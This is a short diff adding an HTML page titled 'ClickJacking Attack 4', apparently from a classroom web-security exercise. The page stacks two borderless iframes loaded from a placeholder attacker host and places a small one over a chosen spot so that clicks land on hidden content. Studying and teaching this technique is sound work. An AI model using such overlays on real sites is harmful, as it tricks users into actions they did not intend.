@@ -1,0 +1,23 @@
+<html>
+<head>
+<title>ClickJacking Attack 4</title>
+<style type="text/css">
+   #outer  {position:absolute; top:0px; left:0px}
+   #inner  {position:absolute; top:210px; left:75px}
+</style>
+</head>
+
+<body>
+
+<iframe id="outer" src="http://www.attacker32.com/attack/class_rocks.html"
+        style="border:0px; width:800px; height:1500px;">
+</iframe>
+
+<iframe id="inner" src="http://www.attacker32.com/attack/class_sucks.html"
+        scrolling="no"
+        style="border:0px; width:120px; height:50px;">
+</iframe>
+
+</body>
+</html>
+
